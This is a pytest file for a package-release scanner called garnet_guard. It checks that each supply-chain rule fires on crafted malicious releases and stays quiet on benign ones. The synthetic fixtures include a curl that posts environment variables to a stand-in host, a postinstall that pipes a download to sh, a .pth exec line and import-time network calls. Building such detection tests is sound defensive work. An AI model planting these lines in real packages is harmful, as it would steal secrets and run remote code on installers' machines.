"""Every built rule, proven to fire and to stay quiet. Synthetic; no real malware.

Each row pairs a crafted release with the trusted one before it. The firing
rows are shaped like the real incidents in ``backtest/incidents.toml``; the
quiet rows make the same kind of change in a way that should not be reported.
Each row runs for every ecosystem its rule is registered for, unless it names
its own. ``docs/rule-coverage.md`` points here, and ``test_every_built_rule_has_rows``
fails when a rule is registered for an ecosystem without a firing and a quiet row there.
"""

from __future__ import annotations

from dataclasses import dataclass, replace
from datetime import UTC, datetime, timedelta

import pytest

from garnet_guard.checks import ALL_CHECKS
from garnet_guard.engine import run_checks
from garnet_guard.models import (
    CallSite,
    Change,
    DependencyProfile,
    FactError,
    Limits,
    ReleaseFacts,
    Requirement,
    Severity,
    SourceMatch,
    UnsourcedFile,
    Verdict,
)
from tests.builders import prov, release

CHANGE = Change("pypi", "demo", "1.0", "1.1")
WHEEL = "demo-1.1-py3-none-any.whl"
INIT = "def hello():\n    return 1\n"
PKG = {"demo/__init__.py": INIT}
SETUP = "from setuptools import setup\n\nsetup(name='demo')\n"
SETUP_PHONES_HOME = (
    "import subprocess\nfrom setuptools import setup\n\n"
    "subprocess.check_output(['curl', '-s', 'https://example.invalid/x'])\n"
    "setup(name='demo')\n"
)
BACKEND = '[build-system]\nbuild-backend = "{}"\n'
IN_TREE = '[build-system]\nbuild-backend = "_build"\nbackend-path = ["."]\n'
SRC = {
    "demo/__init__.py": INIT,
    "setup.py": SETUP,
    "pyproject.toml": BACKEND.format("setuptools.build_meta"),
}
# The lightning 2.6.2 shape: a thread started at import runs a subprocess.
THREAD_PAYLOAD = (
    "import subprocess, threading\n\n"
    "def _run():\n    subprocess.Popen(['python', 'demo/_rt/start.py'])\n\n"
    "threading.Thread(target=_run, daemon=True).start()\n"
)
# The ultralytics 8.3.45 shape: os.system straight at module level.
TOP_LEVEL_PAYLOAD = "import os\n\nos.system('curl -d \"$(printenv)\" https://example.invalid/x')\n"


@dataclass(frozen=True)
class Row:
    rule: str
    label: str
    base: ReleaseFacts | None
    cand: ReleaseFacts
    fires: bool
    verdict: Verdict | None = None  # expected when the rule fires, if it sets one
    instead: str | None = None  # a rule that must fire when this one stays quiet
    ecosystems: tuple[str, ...] | None = None  # None: every ecosystem the rule runs on


PYPI = ("pypi",)
NPM = ("npm",)


def _sdist(version: str, files: dict[str, str | bytes]) -> ReleaseFacts:
    return release(version, sdist_files=files, sdist_only=True)


def _npm(version: str, scripts: dict[str, str] | None = None) -> ReleaseFacts:
    """An npm release: one tarball whose package.json has ``scripts``."""
    rel = release(version, PKG)
    art = replace(
        rel.artifacts[0],
        filename=f"demo-{version}.tgz",
        packagetype="tarball",
        install_scripts=tuple(sorted((scripts or {}).items())),
    )
    return replace(rel, ecosystem="npm", artifacts=(art,))


def _downloaded(rel: ReleaseFacts, sha256: str) -> ReleaseFacts:
    arts = tuple(replace(a, inspected=True, downloaded_sha256=sha256) for a in rel.artifacts)
    return replace(rel, artifacts=arts)


def _sourced(rel: ReleaseFacts, *unmatched: UnsourcedFile) -> ReleaseFacts:
    """A release whose wheel was compared with the tree at its tag (GRN-C007 facts)."""
    match = SourceMatch("o/r", f"v{rel.version}", "c" * 40, "", 1, unmatched)
    art = replace(rel.artifacts[0], source_match=match)
    return replace(rel, artifacts=(art, *rel.artifacts[1:]))


UPLOADED = datetime(2026, 9, 1, tzinfo=UTC)


def _metadata(version: str, *requires: str, metadata_version: str = "2.1") -> str:
    lines = [f"Metadata-Version: {metadata_version}", "Name: demo", f"Version: {version}"]
    return "\n".join([*lines, *(f"Requires-Dist: {r}" for r in requires)]) + "\n"


def _depends(version: str, *requires: str) -> ReleaseFacts:
    """A PyPI release whose wheel METADATA declares ``requires``, uploaded on ``UPLOADED``."""
    rel = release(
        version, {**PKG, f"demo-{version}.dist-info/METADATA": _metadata(version, *requires)}
    )
    arts = tuple(replace(a, uploaded_at=UPLOADED) for a in rel.artifacts)
    return replace(rel, artifacts=arts)


def _npm_depends(version: str, *deps: tuple[str, str]) -> ReleaseFacts:
    """An npm release whose package.json ``dependencies`` are ``deps``."""
    rel = _npm(version)
    reqs = tuple(Requirement(name, f"{name}@{rng}") for name, rng in deps)
    art = replace(rel.artifacts[0], uploaded_at=UPLOADED, requirements=reqs, requirements_read=True)
    return replace(rel, artifacts=(art,))


def _profiled(rel: ReleaseFacts, *profiles: DependencyProfile) -> ReleaseFacts:
    return replace(rel, dependencies=profiles)


def _profile(name: str, age_days: int | None, releases: int = 1) -> DependencyProfile:
    """A registry profile; ``age_days`` None means the registry has no such package."""
    if age_days is None:
        return DependencyProfile(name, on_registry=False)
    return DependencyProfile(
        name, True, UPLOADED - timedelta(days=age_days), releases, source_repo=f"{name}/{name}"
    )


def _rows() -> list[Row]:
    attested = release("1.0")
    rows: list[Row] = []

    def fires(
        rule: str,
        label: str,
        base: ReleaseFacts | None,
        cand: ReleaseFacts,
        verdict: Verdict | None = None,
        eco: tuple[str, ...] | None = None,
    ) -> None:
        rows.append(Row(rule, label, base, cand, True, verdict, ecosystems=eco))

    def quiet(
        rule: str,
        label: str,
        base: ReleaseFacts | None,
        cand: ReleaseFacts,
        instead: str | None = None,
        eco: tuple[str, ...] | None = None,
    ) -> None:
        rows.append(Row(rule, label, base, cand, False, instead=instead, ecosystems=eco))

    # GRN-T001 lost-provenance
    fires(
        "GRN-T001",
        "attested before, no attestation now",
        attested,
        release("1.1", provenance="none"),
    )
    quiet(
        "GRN-T001",
        "never attested",
        release("1.0", provenance="none"),
        release("1.1", provenance="none"),
    )
    quiet(
        "GRN-T001",
        "attestation couldn't be fetched",
        attested,
        release("1.1", provenance=None),
        instead="GRN-E001",
    )
    quiet("GRN-T001", "no trusted version", None, release("1.1", provenance="none"))

    # GRN-T002 publisher-changed
    fires(
        "GRN-T002",
        "attested by another repository",
        attested,
        release("1.1", provenance=prov(WHEEL, repo="github.com/evil/r", repo_id="2")),
    )
    quiet(
        "GRN-T002",
        "repository renamed, same id",
        attested,
        release("1.1", provenance=prov(WHEEL, repo="github.com/o/renamed", repo_id="1")),
    )
    quiet(
        "GRN-T002",
        "same repository, different case",
        attested,
        release("1.1", provenance=prov(WHEEL, repo="github.com/O/R")),
    )
    quiet(
        "GRN-T002",
        "trusted version wasn't attested",
        release("1.0", provenance="none"),
        release("1.1", provenance=prov(WHEEL, repo="github.com/evil/r", repo_id="2")),
    )

    # GRN-T003 workflow-changed
    fires(
        "GRN-T003",
        "another workflow file",
        attested,
        release("1.1", provenance=prov(WHEEL, workflow=".github/workflows/other.yml")),
    )
    fires(
        "GRN-T003",
        "environment added",
        attested,
        release("1.1", provenance=prov(WHEEL, environment="release")),
    )
    quiet("GRN-T003", "same workflow and environment", attested, release("1.1"))
    quiet(
        "GRN-T003",
        "different repository is T002, not T003",
        attested,
        release(
            "1.1",
            provenance=prov(
                WHEEL, repo="github.com/evil/r", repo_id="2", workflow=".github/workflows/other.yml"
            ),
        ),
    )

    # GRN-T004 no-matching-tag
    fires(
        "GRN-T004", "trusted version tagged, new one not", release("1.0"), release("1.1", tag=False)
    )
    quiet("GRN-T004", "project never tags", release("1.0", tag=False), release("1.1", tag=False))
    quiet("GRN-T004", "tag lookup didn't run", release("1.0"), release("1.1", tag=None))

    # GRN-T005 outside-trusted-publishing. PyPI accepts attestations only through
    # Trusted Publishing, so on PyPI this rule is dormant; the pure rule still works.
    outside = replace(prov(WHEEL), trusted_publishing=False)
    fires(
        "GRN-T005",
        "attested outside Trusted Publishing",
        attested,
        release("1.1", provenance=outside),
    )
    quiet("GRN-T005", "both through Trusted Publishing", attested, release("1.1"))
    quiet(
        "GRN-T005",
        "trusted version wasn't through Trusted Publishing",
        release(
            "1.0", provenance=replace(prov("demo-1.0-py3-none-any.whl"), trusted_publishing=False)
        ),
        release("1.1", provenance=outside),
    )

    # GRN-T007 invalid-attestation
    fires(
        "GRN-T007",
        "attestation fails verification",
        attested,
        release("1.1", provenance=prov(WHEEL, verified=False)),
        Verdict.BLOCK,
    )
    quiet(
        "GRN-T007",
        "verifier couldn't run",
        attested,
        release("1.1", provenance=replace(prov(WHEEL, verified=False), verification_ran=False)),
        instead="GRN-E001",
    )
    quiet(
        "GRN-T007",
        "no attestation at all is T001, not T007",
        attested,
        release("1.1", provenance="none"),
    )

    # GRN-T008 hash-mismatch
    fires(
        "GRN-T008",
        "download doesn't match the registry hash",
        attested,
        _downloaded(release("1.1"), "f" * 64),
        Verdict.BLOCK,
    )
    fires(
        "GRN-T008",
        "trusted version's download doesn't match",
        _downloaded(release("1.0"), "f" * 64),
        release("1.1"),
        Verdict.BLOCK,
    )
    quiet("GRN-T008", "download matches", attested, _downloaded(release("1.1"), "0" * 64))

    # GRN-C001 new-pth-file
    pth_payload = "import os; exec(os.environ.get('X', ''))\n"
    fires(
        "GRN-C001",
        "new .pth with an import line",
        release("1.0", PKG),
        release("1.1", {**PKG, "demo.pth": pth_payload}),
    )
    fires(
        "GRN-C001",
        "existing .pth gains an import line",
        release("1.0", {**PKG, "demo.pth": "demo\n"}),
        release("1.1", {**PKG, "demo.pth": "demo\nimport demo._boot\n"}),
    )
    quiet(
        "GRN-C001",
        "same .pth in both",
        release("1.0", {**PKG, "demo.pth": "demo\n"}),
        release("1.1", {**PKG, "demo.pth": "demo\n"}),
    )
    quiet("GRN-C001", "no .pth anywhere", release("1.0", PKG), release("1.1", PKG))

    # GRN-C002 new-build-hook on PyPI (sdists only; wheels don't build)
    fires(
        "GRN-C002",
        "setup.py gains a network call",
        _sdist("1.0", SRC),
        _sdist("1.1", {**SRC, "setup.py": SETUP_PHONES_HOME}),
        eco=PYPI,
    )
    fires(
        "GRN-C002",
        "build backend moves in-tree",
        _sdist("1.0", SRC),
        _sdist("1.1", {**SRC, "pyproject.toml": IN_TREE, "_build.py": "import os\n"}),
        eco=PYPI,
    )
    fires(
        "GRN-C002",
        "build backend switches to an unknown one",
        _sdist("1.0", SRC),
        _sdist("1.1", {**SRC, "pyproject.toml": BACKEND.format("fast_build.api")}),
        eco=PYPI,
    )
    quiet(
        "GRN-C002",
        "build backend switches to a well-known one",
        _sdist("1.0", SRC),
        _sdist("1.1", {**SRC, "pyproject.toml": BACKEND.format("hatchling.build")}),
        eco=PYPI,
    )
    quiet("GRN-C002", "setup.py unchanged", _sdist("1.0", SRC), _sdist("1.1", SRC), eco=PYPI)
    quiet(
        "GRN-C002",
        "same calls, setup.py rewritten",
        _sdist("1.0", {**SRC, "setup.py": SETUP_PHONES_HOME}),
        _sdist("1.1", {**SRC, "setup.py": SETUP_PHONES_HOME + "\n# v1.1\n"}),
        eco=PYPI,
    )
    # GRN-C002 on npm: package.json scripts that run on the installing machine.
    # The @ctrl/tinycolor 4.1.1 and nx 21.5.0 shape: a postinstall appears.
    fires(
        "GRN-C002",
        "postinstall script added",
        _npm("1.0"),
        _npm("1.1", {"postinstall": "node scripts/setup.js"}),
        eco=NPM,
    )
    fires(
        "GRN-C002",
        "install script changed",
        _npm("1.0", {"postinstall": "node scripts/build.js"}),
        _npm("1.1", {"postinstall": "curl -s https://example.invalid/x | sh"}),
        eco=NPM,
    )
    quiet(
        "GRN-C002",
        "install scripts unchanged",
        _npm("1.0", {"postinstall": "node scripts/build.js"}),
        _npm("1.1", {"postinstall": "node scripts/build.js"}),
        eco=NPM,
    )
    quiet("GRN-C002", "no install scripts", _npm("1.0"), _npm("1.1"), eco=NPM)

    # GRN-C003 new-import-time-exec
    fires(
        "GRN-C003",
        "thread started at import runs a process",
        release("1.0", PKG),
        release("1.1", {"demo/__init__.py": INIT + THREAD_PAYLOAD}),
    )
    fires(
        "GRN-C003",
        "os.system at module level",
        release("1.0", PKG),
        release("1.1", {"demo/__init__.py": INIT + TOP_LEVEL_PAYLOAD}),
    )
    fires(
        "GRN-C003",
        "new module with a socket at import",
        release("1.0", PKG),
        release(
            "1.1",
            {
                **PKG,
                "demo/_net.py": "import socket\n\nsocket.create_connection(('example.invalid', 443))\n",
            },
        ),
    )
    quiet(
        "GRN-C003",
        "same import-time call in both",
        release("1.0", {"demo/__init__.py": INIT + THREAD_PAYLOAD}),
        release("1.1", {"demo/__init__.py": INIT + THREAD_PAYLOAD}),
    )
    quiet(
        "GRN-C003",
        "call inside a function nothing calls at import",
        release("1.0", PKG),
        release(
            "1.1",
            {
                "demo/__init__.py": INIT
                + "import subprocess\n\ndef run():\n    subprocess.run(['ls'])\n"
            },
        ),
    )
    quiet(
        "GRN-C003",
        "call under the __main__ guard",
        release("1.0", PKG),
        release(
            "1.1",
            {
                "demo/__init__.py": INIT
                + "import os\n\nif __name__ == '__main__':\n    os.system('ls')\n"
            },
        ),
    )

    # GRN-C007 code-not-in-source
    # The ultralytics 8.3.42 shape: the build wrote a file the tag doesn't have.
    dl_payload = "import subprocess\n\ndef run(cmd):\n    return subprocess.Popen(cmd)\n"
    injected = UnsourcedFile("demo/dl.py", True, (CallSite("subprocess.Popen", 4, "run"),))
    fires(
        "GRN-C007",
        "published file differs from the tag and gains a process call",
        release("1.0", PKG),
        _sourced(release("1.1", {**PKG, "demo/dl.py": dl_payload}), injected),
        eco=PYPI,
    )
    fires(
        "GRN-C007",
        "published file is absent from the tag and runs a process",
        release("1.0", PKG),
        _sourced(
            release("1.1", {**PKG, "demo/dl.py": dl_payload}),
            UnsourcedFile("demo/dl.py", False, (CallSite("subprocess.Popen", 4, "run"),)),
        ),
        eco=PYPI,
    )
    quiet(
        "GRN-C007",
        "generated file without sensitive calls",
        release("1.0", PKG),
        _sourced(
            release("1.1", {**PKG, "demo/_version.py": "v = '1.1'\n"}),
            UnsourcedFile("demo/_version.py", False, ()),
        ),
        eco=PYPI,
    )
    quiet(
        "GRN-C007",
        "trusted version carried the same call outside its source",
        _sourced(release("1.0", {**PKG, "demo/dl.py": dl_payload}), injected),
        _sourced(release("1.1", {**PKG, "demo/dl.py": dl_payload}), injected),
        eco=PYPI,
    )
    quiet(
        "GRN-C007",
        "every file matches the tag",
        release("1.0", PKG),
        _sourced(release("1.1", PKG)),
        eco=PYPI,
    )
    quiet(
        "GRN-C007",
        "no comparison was made",
        release("1.0", PKG),
        release("1.1", {**PKG, "demo/dl.py": dl_payload}),
        eco=PYPI,
    )

    # GRN-C008 new-dependency
    # The event-stream 3.3.6 shape: an added dependency first published weeks before.
    fires(
        "GRN-C008",
        "new dependency first published weeks before the release",
        _depends("1.0", "requests>=2"),
        _profiled(
            _depends("1.1", "requests>=2", "streamhelper>=0.1"), _profile("streamhelper", 35)
        ),
        Verdict.WARN,
        eco=PYPI,
    )
    fires(
        "GRN-C008",
        "new dependency the registry doesn't have",
        _depends("1.0", "requests>=2"),
        _profiled(_depends("1.1", "requests>=2", "streamhelper"), _profile("streamhelper", None)),
        Verdict.WARN,
        eco=PYPI,
    )
    fires(
        "GRN-C008",
        "new established dependency, listed at info",
        _depends("1.0", "requests>=2"),
        _profiled(_depends("1.1", "requests>=2", "idna>=3"), _profile("idna", 3000, 40)),
        Verdict.PASS,
        eco=PYPI,
    )
    quiet(
        "GRN-C008",
        "same dependencies with a new version range",
        _depends("1.0", "requests>=2"),
        _depends("1.1", "requests>=2.31"),
        eco=PYPI,
    )
    quiet(
        "GRN-C008",
        "new dependency only behind an extra",
        _depends("1.0", "requests>=2"),
        _depends("1.1", "requests>=2", 'pytest; extra == "test"'),
        eco=PYPI,
    )
    quiet(
        "GRN-C008",
        "an old sdist PKG-INFO that doesn't state dependencies",
        _sdist("1.0", {**SRC, "PKG-INFO": _metadata("1.0", metadata_version="1.2")}),
        _sdist("1.1", {**SRC, "PKG-INFO": _metadata("1.1", "requests>=2", metadata_version="1.2")}),
        eco=PYPI,
    )
    fires(
        "GRN-C008",
        "npm: new dependency first published weeks before the release",
        _npm_depends("1.0", ("through", "~2.3.1")),
        _profiled(
            _npm_depends("1.1", ("through", "~2.3.1"), ("streamhelper", "^0.1.0")),
            _profile("streamhelper", 35),
        ),
        Verdict.WARN,
        eco=NPM,
    )
    quiet(
        "GRN-C008",
        "npm: same dependencies",
        _npm_depends("1.0", ("through", "~2.3.1")),
        _npm_depends("1.1", ("through", "~2.3.4")),
        eco=NPM,
    )

    # GRN-K001 known-malicious
    listed = replace(release("1.1"), advisories=("MAL-2026-1",), advisories_checked=True)
    fires("GRN-K001", "OSV lists the release", attested, listed, Verdict.BLOCK)
    quiet(
        "GRN-K001", "OSV lists nothing", attested, replace(release("1.1"), advisories_checked=True)
    )

    # GRN-E001 fetch-failed
    fires(
        "GRN-E001",
        "a lookup failed",
        attested,
        replace(
            release("1.1"), errors=(FactError("GRN-E001", "OSV lookup failed", ("GRN-K001",)),)
        ),
        Verdict.WARN,
    )
    fires(
        "GRN-E001",
        "a lookup failed for the trusted version",
        replace(
            release("1.0"), errors=(FactError("GRN-E001", "tag lookup failed", ("GRN-T004",)),)
        ),
        release("1.1"),
        Verdict.WARN,
    )
    quiet("GRN-E001", "everything fetched", attested, release("1.1", PKG))

    # GRN-E002 parse-failed
    fires(
        "GRN-E002",
        "new file isn't Python 3",
        release("1.0", PKG),
        release("1.1", {**PKG, "demo/legacy.py": "print 'py2'\n"}),
    )
    quiet(
        "GRN-E002",
        "unparsable file unchanged since the trusted version",
        release("1.0", {**PKG, "demo/legacy.py": "print 'py2'\n"}),
        release("1.1", {**PKG, "demo/legacy.py": "print 'py2'\n"}),
    )

    # GRN-E003 budget-exceeded
    fires(
        "GRN-E003",
        "more entries than the limit",
        release("1.0", PKG),
        release("1.1", {**PKG, "demo/a.py": "", "demo/b.py": ""}, limits=Limits(max_entries=2)),
    )
    fires(
        "GRN-E003",
        "a Python file over the parse limit",
        release("1.0", PKG),
        release("1.1", {**PKG, "demo/big.py": "x = 1\n" * 10}, limits=Limits(max_py_file_bytes=32)),
    )
    quiet(
        "GRN-E003",
        "within every limit",
        release("1.0", PKG),
        release("1.1", {**PKG, "demo/a.py": ""}),
    )
    return rows


ROWS = _rows()
# Raised by the facts layer rather than registered in ALL_CHECKS.
FACT_CODES = {"GRN-E001", "GRN-E002", "GRN-E003"}


def _registered(rule: str) -> list[str]:
    """The ecosystems a rule is registered for; fact-layer codes run everywhere."""
    for rule_id, _, ecos in ALL_CHECKS:
        if rule_id == rule:
            return sorted(ecos)
    return ["pypi"]


def _ecosystems(row: Row) -> list[str]:
    """Where a row runs: everywhere its rule is registered, unless the row says."""
    return sorted(row.ecosystems) if row.ecosystems else _registered(row.rule)


CASES = [(row, eco) for row in ROWS for eco in _ecosystems(row)]


@pytest.mark.parametrize(
    ("row", "eco"), CASES, ids=[f"{r.rule} {eco} {r.label}" for r, eco in CASES]
)
def test_rule(row: Row, eco: str) -> None:
    result = run_checks(replace(CHANGE, ecosystem=eco), row.base, row.cand)
    ids = {f.rule_id for f in result.findings}
    if row.fires:
        assert row.rule in ids, f"{row.rule} should fire: {row.label}"
        found = [f for f in result.findings if f.rule_id == row.rule]
        assert all(f.severity >= Severity.INFO and f.evidence for f in found)
        if row.verdict is not None:
            assert result.verdict == row.verdict
    else:
        assert row.rule not in ids, f"{row.rule} should stay quiet: {row.label}"
        if row.instead is not None:
            assert row.instead in ids, f"{row.instead} should report instead: {row.label}"


def test_every_built_rule_has_rows() -> None:
    built = {rule for rule, _, _ in ALL_CHECKS} | FACT_CODES
    covered = {r.rule for r in ROWS}
    assert built <= covered, f"rules without rows: {sorted(built - covered)}"
    assert covered <= built, f"rows for rules that aren't built: {sorted(covered - built)}"
    for row in ROWS:
        assert set(_ecosystems(row)) <= set(_registered(row.rule)), (
            f"{row.rule} is not registered for {row.ecosystems}: {row.label}"
        )
    for rule in sorted(built):
        for eco in _registered(rule):
            kinds = {r.fires for r, e in CASES if r.rule == rule and e == eco}
            assert kinds == {True, False}, f"{rule} on {eco} needs a firing and a quiet row"
